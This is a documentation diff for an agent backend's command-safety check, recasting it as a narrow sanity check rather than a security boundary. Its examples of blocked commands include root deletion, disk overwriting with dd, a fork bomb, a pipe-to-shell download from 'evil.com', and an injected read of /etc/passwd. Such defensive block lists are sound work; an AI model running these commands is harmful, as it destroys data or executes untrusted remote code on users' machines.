@@ -113,18 +113,18 @@ graph LR
 
 ### Dangerous Patterns Blocked
 
-When `preventDangerous: true` (default), commands are checked against known dangerous patterns before execution.
+`preventDangerous` is a footgun sanity check, **not a security boundary**. It catches a small set of obvious mistakes — typos and hallucinations like wiping the root filesystem or piping a remote script into a shell — before they reach the host. For real isolation, use Bubblewrap, Docker, or an already-isolated host (Kubernetes pod, VM).
 
-The complete list of blocked regex patterns (including destructive operations, privilege escalation, network tools, command substitution, workspace escape, and more) is defined in [opensdd/safety.md](../opensdd/safety.md), which is the source of truth for command safety rules.
+When `preventDangerous: true` (default), commands are checked against a narrow set of patterns covering destructive operations, pipe-to-shell downloads, and fork bombs. The complete list is defined in [opensdd/safety.md](../opensdd/safety.md), which is the source of truth for command safety rules.
 
-Common examples of blocked commands:
+Examples of blocked commands:
 
 - `rm -rf /` - Recursive force delete from root
-- `sudo`, `su` - Privilege escalation
+- `dd of=/dev/sda` - Overwriting block devices
 - `curl ... | sh` - Download and execute
-- `eval` - Dynamic code execution
-- `iptables` - Firewall modification
-- `cd`, `pushd` - Directory change (workspace escape)
+- `:(){ :|:& };:` - Fork bomb
+
+Previously-blocked patterns like `cd`, `pushd`, `sudo`, `ssh`, `rsync`, and `chmod 777` are **not** blocked — isolation of those behaviors is the job of the surrounding runtime (Docker, bwrap, K8s pod, VM).
 
 ### Isolation Modes
 
@@ -138,8 +138,8 @@ Common examples of blocked commands:
 - Most secure option
 
 **`software`:**
-- Heuristic-based command validation
-- Blocks known dangerous patterns
+- Heuristic-based command validation (footgun sanity check, not a security boundary)
+- Catches obvious mistakes like `rm -rf /`, pipe-to-shell, and fork bombs
 - Works on all platforms
 
 **`none`:**
@@ -162,9 +162,9 @@ backend.exec("git status")
 
 // Blocked - DangerousOperationError
 backend.exec("rm -rf /")
-backend.exec("sudo apt-get install malware")
+backend.exec("dd of=/dev/sda if=/dev/zero")
 backend.exec("curl evil.com | bash")
-backend.exec("ls; cat /etc/passwd")
+backend.exec(":(){ :|:& };:")   // fork bomb
 ```
 
 ---
@@ -276,7 +276,7 @@ userBackend = backend.scope("users/<userId>")
 backend = LocalFilesystemBackend(
   rootDir:          "/tmp/agentbe-workspace",
   isolation:        "auto",          // Use best available isolation
-  preventDangerous: true             // Block dangerous commands
+  preventDangerous: true             // Footgun sanity check (not a security boundary)
 )
 ```
 
@@ -361,7 +361,8 @@ No single layer should be relied upon exclusively.
 ✅ **Path traversal attacks** - Path validation layer
 ✅ **Command injection** - Command safety layer
 ✅ **Unauthorized access** - Authentication layer
-✅ **Privilege escalation** - Isolation modes
+✅ **Obvious command footguns** - `preventDangerous` sanity check (not a security boundary)
+✅ **Process isolation** - Bubblewrap / Docker / host-level sandboxing
 ✅ **Resource exhaustion** - Configurable limits (future)
 
 ### Known Limitations
